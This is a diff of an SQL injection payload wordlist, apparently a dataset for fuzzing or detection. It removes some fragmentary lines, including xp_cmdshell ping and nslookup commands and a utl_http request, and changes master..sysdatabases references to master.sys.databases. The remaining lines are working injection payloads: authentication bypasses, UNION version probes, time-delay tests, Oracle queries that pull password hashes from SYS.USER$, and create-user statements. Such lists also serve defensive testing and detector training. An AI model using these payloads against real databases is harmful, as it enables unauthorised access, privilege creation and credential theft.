@@ -1,5 +1,4 @@
 " or pg_sleep ( __TIME__ ) --
-create user name identified by pass123 temporary tablespace temp default tablespace users;
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i
 select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'
 select * from users where id = 1 or 1#" ( union select 1,version ( ) -- 1
@@ -23,7 +22,6 @@ select * from users where id = '1' * ( \ ) or 1 = 1 -- 1'
 select * from users where id = 1 or \.<\ or 1 = 1 -- 1
 admin" or "1" = "1"--
 select * from users where id = 1 or "%{" or 1 = 1 -- 1
-insert
 select * from users where id = 1 or 1#"? = 1 or 1 = 1 -- 1
 select * from users where id = 1 or "%?" or 1 = 1 -- 1
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 8 ) ) AND 'i' = 'i
@@ -52,13 +50,11 @@ select * from users where id = 1 or ",;" or 1 = 1 -- 1
 admin" or 1 = 1#
 select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1
 \x27UNION SELECT
-PRINT
 select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'
 or 1 = 1--
 1 or pg_sleep ( __TIME__ ) --
 select * from users where id = 1 or ",#" or 1 = 1 -- 1
 admin' ) or ( '1' = '1'/*
-or 2 between 1 and 3
 select * from users where id = 1 or " ) ." = 1 or 1 = 1 -- 1
 select * from users where id = 1 or 1#". union select null,version ( ) -- 1
 admin' or '1' = '1
@@ -104,9 +100,7 @@ select * from users where id = 1 or "%[" or 1 = 1 -- 1
 select * from users where id = 1 or 1#"; = 1 union select 1,version ( ) -- 1
 admin' or '1' = '1'#
 select * from users where id = 1 +$ 1 or 1 = 1 -- 1
-s
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 4 ) ) AND 'i' = 'i
-select * from information_schema.tables--
 select * from users where id = 1 or "$&" or 1 = 1 -- 1
 1 ) ) or pg_sleep ( __TIME__ ) --
 select * from users where id = '1' union select !<@,version ( ) -- 1'
@@ -118,9 +112,6 @@ select * from users where id = 1 or "]1" or 1 = 1 -- 1
 select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1
 or 'unusual' = 'unusual'
 or 1 in ( select @@version ) --
-truncate
-as
- or 3 = 3 --
 select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1
 select * from users where id = 1 <@$$ union select 1,version ( ) -- 1
 admin" ) or ( "1" = "1
@@ -153,7 +144,6 @@ insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', pa
 admin" or "1" = "1"/*
 select * from users where id = 1 or "1 ( " = 1 or 1 = 1 -- 1
 select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1
-like
 or username like char ( 37 ) ;
 ) ) or pg_sleep ( __TIME__ ) --
 select * from users where id = 1 or $+<\ or 1 = 1 -- 1
@@ -181,7 +171,6 @@ select * from users where id = 1 or "{." or 1 = 1 -- 1
 select * from users where id = 1.<@. or 1 = 1 -- 1
 admin" ) or ( "1" = "1"--
 select * from users where id = 1<@.. union select 1,version ( ) -- 1
-; exec xp_regread
 select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'
 select * from users where id = 1 + \+%1 or 1 = 1 -- 1
 select * from users where id = 1 or ";1" or 1 = 1 -- 1
@@ -214,7 +203,6 @@ select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'
 select * from users where id = 1 or ".%" or 1 = 1 -- 1
 admin'/*
 select * from users where id = 1 or " ( #" or 1 = 1 -- 1
-||UTL_HTTP.REQUEST
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 1 ) ) AND 'i' = 'i
 select * from users where id = '1'<@.. union select 1,version ( ) -- 1'
 " ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #
@@ -225,7 +213,6 @@ select * from users where id = '1' <@.$ or 1 = 1 -- 1'
 select * from users where id = 1 +$ . union select null,@@VERSION -- 1
 select * from users where id = 1 or 1#"? union select null,version ( ) -- 1
 admin' ) or '1' = '1'#
-||utl_http.request ( 'httP://192.168.1.1/' ) ||'
 or '7659' = '7659
 select * from users where id = 1 or "{@" or 1 = 1 -- 1
 select * from users where id = 1 union select +!<1,version ( ) -- 1
@@ -239,8 +226,6 @@ select * from users where id = 1 or 1#"{ union select 1,version ( ) -- 1
 select * from users where id = 1. or 1 = 1 -- 1
 select * from users where id = 1 or @#", = 1 union select 1,version ( ) -- 1
 select * from users where id = 1 or ";@" or 1 = 1 -- 1
-ГўВЂВ or 3 = 3 --
-AND 1 = utl_inaddr.get_host_address ( ( SELECT global_name FROM global_name ) ) AND 'i' = 'i
 select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1
 select * from users where id = 1 or ",," = 1 or 1 = 1 -- 1
 select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1
@@ -269,7 +254,6 @@ select * from users where id = '1' + $+%\ or 1 = 1 -- 1'
 " or ""*"
 hi or 1 = 1 --"
 select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1
-; exec master..xp_cmdshell 'ping 172.10.1.255'--
 select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'
 select * from users where id = '1' union select "?"_,version ( ) -- 1'
 select * from information_schema.tables--
@@ -290,7 +274,6 @@ group by userid having 1 = 1--
 select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1
 select * from users where id = 1 *1 or 1 = 1 -- 1
 select * from users where id = 1 or @#"; = 1 or 1 = 1 -- 1
-вЂ or 1 = 1 --
 select * from users where id = 1 *\. union select null,@@VERSION -- 1
 select * from users where id = 1 % ( @ ) or 1 = 1 -- 1
 or 'a' = 'a
@@ -298,8 +281,6 @@ declare @s varchar ( 22 ) select @s =
 select * from users where id = 1 union select 1<@,version ( ) -- 1
 select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1
 select * from users where id = 1 or 1#". union select version ( ) ,version ( ) -- 1
-@variable
-; exec master..xp_cmdshell
 select * from users where id = 1 + ( 1 ) or 1 = 1 -- 1
 select * from users where id = 1 union select @ 1$,version ( ) -- 1
 select * from users where id = 1 union select @ 1a,version ( ) -- 1
@@ -344,7 +325,6 @@ select * from users where id = 1 or 1#"? union select 1,version ( ) -- 1
 or 1 = 1--
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 5 ) ) AND 'i' = 'i
 pg_sleep ( __TIME__ ) --
-вЂ or 3 = 3 --
 select * from users where id = 1 -1<@ union select 1,version ( ) -- 1
 select * from users where id = 1 or "$#" or 1 = 1 -- 1
 ) union select * from information_schema.tables;
@@ -355,7 +335,6 @@ AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SE
 " or "" "
 delete
 ;waitfor delay '0:0:__TIME__'--
- or 1 = 1 --
 1' and non_existant_table = '1
 select * from users where id = 1 or "& ) " or 1 = 1 -- 1
 select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'
@@ -379,7 +358,6 @@ x' and members.email is NULL; --
 or 2 > 1
 select * from users where id = 1.*1 or 1 = 1 -- 1
 " ) or pg_sleep ( __TIME__ ) --
-'
 select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1
 select * from users where id = 1 or "@ ) " or 1 = 1 -- 1
 select * from users where id = 1 or \.<$ or 1 = 1 -- 1
@@ -394,13 +372,11 @@ select * from users where id = 1 or 1#". union select 1,version ( ) -- 1
 select * from users where id = 1 union select @ $,version ( ) -- 1
 select * from users where id = 1 union select +!<@,version ( ) -- 1
 select * from users where id = 1 <@<@ union select null,version ( ) -- 1
-or 2 > 1
 ; exec ( 'sel' + 'ect us' + 'er' )
 anything' OR 'x' = 'x
 select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1
 select * from users where id = 1 union select ( 1 ) ,banner from v$version where rownum = 1 -- 1
 select * from users where id = 1 * ( \ ) union select null,@@VERSION -- 1
-&'
 a' or 3 = 3--
 select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'
 select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1
@@ -412,7 +388,6 @@ select * from users where id = 1 or "?;" or 1 = 1 -- 1
 1 waitfor delay '0:0:10'--
 bfilename
 admin' ) or ( '1' = '1'--
-UEf
 -- &password =
 1 or sleep ( __TIME__ ) #
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 6 ) ) AND 'i' = 'i
@@ -422,7 +397,6 @@ select * from users where id = '1' + @ ( 1 ) union select 1,version ( ) -- 1'
 or sleep ( __TIME__ ) #
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 8 ) ) AND 'i' = 'i
 select * from users where id = 1 or 1#", = 1 or 1 = 1 -- 1
-||6
 or 1/*
 and 1 = ( if ( ( load_file ( char ( 110,46,101,120,116 ) ) <>char ( 39,39 ) ) ,1,0 ) ) ;
 select * from users where id = 1.%@ or 1 = 1 -- 1
@@ -436,7 +410,6 @@ select * from users where id = 1 * ( 1 ) union select 1,banner from v$version wh
 or 'whatever' in ( 'whatever' )
 declare @s varchar ( 200 ) select @s = 0x73656c65637420404076657273696f6e exec ( @s )
 select * from users where id = '1' or 1 = 1 -- 1'
-?
 AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( table_name ) ) FROM sys.all_tables ) ) AND 'i' = 'i
 select * from users where id = '1' union select @ 1,version ( ) -- 1'
 admin" ) or ( "1" = "1"#
@@ -455,7 +428,6 @@ or 'something' like 'some%'
 ; if not ( ( select serverproperty ( 'isintegratedsecurityonly' ) ) <> 0 ) waitfor delay '0:0:2' --
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 4 ) ) AND 'i' = 'i
 select * from users where id = '1' or \<\. or 1 = 1 -- 1'
-; exec master..xp_cmdshell 'ping 10.10.1.2'--
 admin' or '1' = '1'--
 ; if not ( ( select serverproperty ( 'isintegratedsecurityonly' ) ) <> 1 ) waitfor delay '0:0:2' --
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 2 ) ) AND 'i' = 'i
@@ -466,7 +438,6 @@ x' and userid is NULL; --
 select * from users where id = '1' *$ 1 or 1 = 1 -- 1'
 select * from users where id = 1 or \<\ union select null,@@VERSION -- 1
 select * from users where id = 1 or "?@" or 1 = 1 -- 1
-вЂ™ or вЂ1вЂ™ = вЂ™1
 select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'
 admin'or 1 = 1 or '' = '
 select * from users where id = '1' or !<1 union select 1,version ( ) -- 1'
@@ -483,14 +454,11 @@ select * from users where id = '1' + @ @1 union select 1,version ( ) -- 1'
 select * from users where id = '1' union select null,banner from v$version where rownum = 1 -- 1'
 select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1
 select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1
-update
 or 1/*
 select * from users where id = 1.<1# union select 1,version ( ) -- 1
 " ) ) or pg_sleep ( __TIME__ ) --
-||'6
 select * from users where id = 1. <@ union select 1,version ( ) -- 1
 or ( EXISTS )
-^'
 or 'text' = n'text'
 select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1
 select * from users where id = '1' union select $ _,@@VERSION -- 1'
@@ -531,7 +499,6 @@ select * from users where id = 1 + ( 1 ) union select 1,banner from v$version wh
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 3 ) ) AND 'i' = 'i
 or userid like '%
 union ( select NULL, NULL, ( select @@version ) ) --
-/
 select * from users where id = 1 or $<\ or 1 = 1 -- 1
 admin"/*
 select * from users where id = 1. union select 1,version ( ) -- 1
@@ -557,7 +524,6 @@ select * from users where id = '1' + @<@# union select 1,version ( ) -- 1'
 or 2 between 1 and 3
 union all select @@version--
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 8 ) ) AND 'i' = 'i
-t'exec master..xp_cmdshell 'nslookup www.google.com'--
 " or isNULL ( 1/0 ) /*
 select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'
 select * from users where id = 1 or "{?" or 1 = 1 -- 1
@@ -567,7 +533,6 @@ or 'a' = 'a
 union all select @@version--
 select * from users where id = 1 or 1<@ = 1 union select 1,version ( ) -- 1
 admin" or 1 = 1/*
-or ( EXISTS )
 select * from users where id = 1<@<@ union select 1,version ( ) -- 1
 declare @s varchar ( 8000 ) select @s = 0x73656c ...
 select * from users where id = '1' union select +\#,@@VERSION -- 1'
@@ -614,7 +579,6 @@ x' or 1 = 1 or 'x' = 'y
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 8 ) ) AND 'i' = 'i
 select * from users where id = 1 union select 1 $,version ( ) -- 1
 ) or ( 'x' ) = ( 'x
-(
 select * from users where id = 1 or 1#" ( union select version ( ) ,version ( ) -- 1
 select * from users where id = 1.%@ union select 1,version ( ) -- 1
 select * from users where id = 1 +$+ union select null,@@VERSION -- 1
@@ -624,7 +588,6 @@ select * from users where id = 1 +$+. union select null,@@VERSION -- 1
 select * from users where id = 1 +1<@ union select null,version ( ) -- 1
 ) ) or sleep ( __TIME__ ) = '
 having 1 = 1--
-!
 select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1
 group by userid having 1 = 1--
 select * from users where id = '1' or @ 1 = 1 union select 1,version ( ) -- 1'
@@ -637,10 +600,8 @@ select * from users where id = 1 or 1#"1 union select 'a',version ( ) -- 1
 select * from users where id = 1 or 1#". = 1 union select 1,version ( ) -- 1
 select * from users where id = 1 or @#"{ = 1 union select 1,version ( ) -- 1
 AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( USERNAME ) ) FROM SYS.ALL_USERS ) ) AND 'i' = 'i
-sqlvuln
 select * from users where id = 1 or ".{" or 1 = 1 -- 1
 select * from users where id = 1 or 1#"; union select 'a',version ( ) -- 1
-0x730065006c0065006300740020004000400076006500 ...
 select * from users where id = 1 union select 1 1$,version ( ) -- 1
 select * from users where id = 1. <@ union select version ( ) ,version ( ) -- 1
 declare @s varchar ( 8000 ) select @s = 0x73656c65637420404076657273696f6e
@@ -652,7 +613,6 @@ select * from users where id = '1' union select \.%1,@@VERSION -- 1'
 or username like char ( 37 ) ;
 select * from users where id = 1 or 1#"$ union select version ( ) ,version ( ) -- 1
 or 'something' = 'some'+'thing'
-#NAME?
 or 1 in ( select @@version ) --
 declare @q nvarchar ( 4000 ) select @q =
 select * from users where id = 1.&&@ union select 1,version ( ) -- 1
@@ -676,7 +636,6 @@ select * from users where id = 1 or @#" ( = 1 or 1 = 1 -- 1
 ; begin declare @var varchar ( 8000 ) set @var = ' ...
 select * from users where id = 1 + \+%$ or 1 = 1 -- 1
 ) or pg_sleep ( __TIME__ ) --
-PRINT @@variable
 select * from users where id = 1 or @#". = 1 or 1 = 1 -- 1
 or a = a--
 or 'x' = 'x
@@ -717,15 +676,12 @@ select * from users where id = 1 %$ . or 1 = 1 -- 1
 admin" ) or "1" = "1"--
 1 ) ) or sleep ( __TIME__ ) #
 select * from users where id = 1 +$ . or 1 = 1 -- 1
-( sqlattempt2 )
 select * from users where id = 1 *$ . union select null,@@VERSION -- 1
-x' and email is NULL; --
 select * from users where id = '1' * ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1'
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 8 ) ) AND 'i' = 'i
 select * from users where id = 1 or 1#"@ union select version ( ) ,version ( ) -- 1
 1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 select * from users where id = '1'<@$$ union select 1,version ( ) -- 1'
-@var select @var as var into temp end --
 select * from users where id = 1 + ( \. ) union select null,@@VERSION -- 1
 or '' = '
 select * from users where id = 1 or ",&" or 1 = 1 -- 1
@@ -746,7 +702,6 @@ select * from users where id = 1 union select 1`\`,version ( ) -- 1
 select * from users where id = 1 or ";&" or 1 = 1 -- 1
 select * from users where id = '1' or \<1 or 1 = 1 -- 1'
 select * from users where id = '1' + ( \ ) union select 1,@@VERSION -- 1'
-t'exec master..xp_cmdshell 'nslookup www.googl ...
 " ) or benchmark ( 10000000,MD5 ( 1 ) ) #
 union select
 select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1
@@ -817,7 +772,6 @@ or a = a--
 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
 select * from users where id = 1 union select 1 $$,version ( ) -- 1
 select * from users where id = 1 or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1
-( sqlvuln )
 or 'text' = n'text'
 or '1' = '1'--
 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q )
@@ -827,11 +781,9 @@ select * from users where id = 1 or "1;" = 1 or 1 = 1 -- 1
 select * from users where id = 1 or "{{" or 1 = 1 -- 1
 select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'
 select * from users where id = 1 or ",?" or 1 = 1 -- 1
-1 exec sp_ ( or exec xp_ )
 select * from users where id = '1' or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1'
 "a"" or 3 = 3--"
 admin' --
-( select top 1
 select * from users where id = 1 +1 or 1 = 1 -- 1
 having
 ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #
@@ -852,24 +804,19 @@ AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( 
 limit
 or 1 = 1#
 select * from users where id = 1 or "{%" or 1 = 1 -- 1
-*|
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 7 ) ) AND 'i' = 'i
 create user name identified by 'pass123'
 select * from users where id = 1.*\ union select null,@@VERSION -- 1
 select * from users where id = 1 or 1#"{ union select 'a',version ( ) -- 1
-.s
 select * from users where id = 1 or " ( ," = 1 or 1 = 1 -- 1
-|
 select * from users where id = 1 <@1$ or 1 = 1 -- 1
 x' OR full_name LIKE '%Bob%
-#NAME?
 select * from users where id = 1 union select @&&@,version ( ) -- 1
 select * from users where id = 1 or "?[" or 1 = 1 -- 1
 select * from users where id = 1 union select !<@,version ( ) -- 1
 or benchmark ( 10000000,MD5 ( 1 ) ) #
 ) ;waitfor delay '0:0:__TIME__'--
 or sleep ( __TIME__ ) = '
-# from wapiti
 " or sleep ( __TIME__ ) = "
 sleep ( __TIME__ ) #
 ) or pg_sleep ( __TIME__ ) --
@@ -959,7 +906,6 @@ call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )
 1' ) as rvch where 1863 = 1863 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --
 1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao
 -9446 ) ) as wmrq where 3705 = 3705 union all select 3705#
-iif ( 7889 = 5114,1,1/0 )
 select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'ztmd' = 'ztmd
 1" ) ) union all select null,null,null,null,null,null,null,null#
 1%' ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --
@@ -1097,7 +1043,7 @@ select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 
 1%" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #
 -1065 ) ) union all select 7437,7437,7437,7437,7437,7437,7437,7437--
 -1603' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'abmo' = 'abmo
-1', ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )
+1', ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master.sys.databases ) end ) )
 1%" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #
 1 where 7051 = 7051 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
 1' ) where 6672 = 6672 union all select null,null,null,null,null,null,null,null,null,null--
@@ -1129,7 +1075,7 @@ select ( case when ( 9455 = 6007 ) then 9455 else 9455* ( select 9455 from mysql
 1' where 7104 = 7104 union all select null,null,null,null,null,null,null#
 1%' order by 1#
 1" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( "nwzu" like "nwzu
-select ( case when ( 6961 = 7460 ) then 1 else 6961* ( select 6961 from master..sysdatabases ) end ) --
+select ( case when ( 6961 = 7460 ) then 1 else 6961* ( select 6961 from master.sys.databases ) end ) --
 select ( case when ( 3676 = 8635 ) then 3676 else 1/ ( select 0 ) end ) --
 1%" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --
 -5137 ) or 9323 = 9323#
@@ -1194,7 +1140,7 @@ select ( case when ( 5390 = 7419 ) then 5390 else 5390* ( select 5390 from mysql
 -8791" ) ) ) or make_set ( 6681 = 6620,6620 ) and ( ( ( "pvdk" = "pvdk
 -3081" ) ) ) or 3736 = 1899
 -4082 ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 7874 = 7874
-select ( case when ( 6615 = 3564 ) then 1 else 6615* ( select 6615 from master..sysdatabases ) end ) --
+select ( case when ( 6615 = 3564 ) then 1 else 6615* ( select 6615 from master.sys.databases ) end ) --
 -7648' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )
 select ( case when ( 9540 = 5786 ) then 9540 else 9540* ( select 9540 from information_schema.character_sets ) end ) #
 select case when 7426 = 6635 then 1 else null end--
@@ -1694,7 +1640,7 @@ select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( '%' = '
 select pg_sleep ( 5 ) -- ojzt
 begin dbms_lock.sleep ( 5 )
 -9202' where 9799 = 9799 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --
-select ( case when ( 9562 = 5996 ) then 1 else 9562* ( select 9562 from master..sysdatabases ) end ) --
+select ( case when ( 9562 = 5996 ) then 1 else 9562* ( select 9562 from master.sys.databases ) end ) --
 1" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( "gxqq" = "gxqq
 1%' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --
 1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )
@@ -1893,7 +1839,7 @@ end and 'blit' = 'blit
 1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'beju' like 'beju
 1'|| ( select 'jbgg' from dual where 1986 = 1986 union all select null,null,null,null,null,null,null,null,null,null#
 -5903%" ) ) ) or 3038 = 3038
-select ( case when ( 4572 = 4086 ) then 1 else 4572* ( select 4572 from master..sysdatabases ) end ) --
+select ( case when ( 4572 = 4086 ) then 1 else 4572* ( select 4572 from master.sys.databases ) end ) --
 1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'tmwy' = 'tmwy
 1" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( "vcjt" like "vcjt
 1" or 6793 = ( select 6793 from pg_sleep ( 5 ) )
@@ -2115,7 +2061,7 @@ select ( case when ( 6204 = 1913 ) then 6204 else 6204* ( select 6204 from infor
 -9057" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #
 1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'iixp' = 'iixp
 1 ) ) ) and 6467 = 1864#
-1', ( select ( case when ( 1392 = 1380 ) then 1 else 1392* ( select 1392 from master..sysdatabases ) end ) )
+1', ( select ( case when ( 1392 = 1380 ) then 1 else 1392* ( select 1392 from master.sys.databases ) end ) )
 1'|| ( select 'xhcr' from dual where 9279 = 9279
 -4323' ) ) or 6968 = 1393
 1'+ ( select gajr where 6653 = 6653 union all select null,null,null,null#
@@ -2162,7 +2108,7 @@ select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.sys
 -3215" ) union all select 4457,4457,4457,4457,4457#
 1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'ndhn' like 'ndhn
 1" ) where 2764 = 2764 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --
-1, ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )
+1, ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master.sys.databases ) end ) )
 1%" ) union all select null,null,null,null#
 1 ) ) rlike ( select ( case when ( 6113 = 1222 ) then 1 else 0x28 end ) ) and ( ( 2815 = 2815
 -5449' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ryvy' like 'ryvy
@@ -2527,7 +2473,7 @@ select ( case when ( 1123 = 9550 ) then 1123 else 1123* ( select 1123 from infor
 1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'rozr' like 'rozr
 -7122" ) union all select 4002,4002,4002,4002,4002,4002,4002,4002#
 -3460%" ) ) ) or 9323 = 9323#
-select ( case when ( 4666 = 4666 ) then 1 else 4666* ( select 4666 from master..sysdatabases ) end ) --
+select ( case when ( 4666 = 4666 ) then 1 else 4666* ( select 4666 from master.sys.databases ) end ) --
